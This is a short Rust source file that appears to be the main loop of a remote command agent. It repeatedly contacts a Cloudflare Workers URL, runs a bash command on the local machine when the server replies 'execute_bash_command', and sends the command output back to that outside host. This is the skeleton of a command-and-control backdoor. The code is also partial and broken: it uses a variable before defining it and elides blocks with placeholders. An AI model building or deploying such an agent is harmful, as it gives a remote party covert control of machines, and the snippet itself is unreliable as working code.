mod command_executor;
mod worker_communication;

#[tokio::main]
async fn main() {
    let worker_url = "https://serverworker.adoba.workers.dev/";

    loop {
        // Send data to the Worker
        let response = match worker_communication::send_data_request(&worker_url, &command_output).await {
            Ok(response) => response,
            Err(e) => {
                println!("Error: {}", e);
                continue;
            }
        };
        

        // Check the response from the Worker
// ... (existing code)

if response == "execute_bash_command" {
    match command_executor::execute_bash_command(true) {
        Ok(command_output) => { 
            // Send command_output to Cloudflare worker
            let response = match worker_communication::send_data_request(&worker_url, &command_output).await {
                // ... 
            };
            // ... 
        },
        Err(e) => println!("Error executing command: {}", e),
    }
} else {
    // ...
}
        // Add more conditions or logic to handle different commands
    }
}
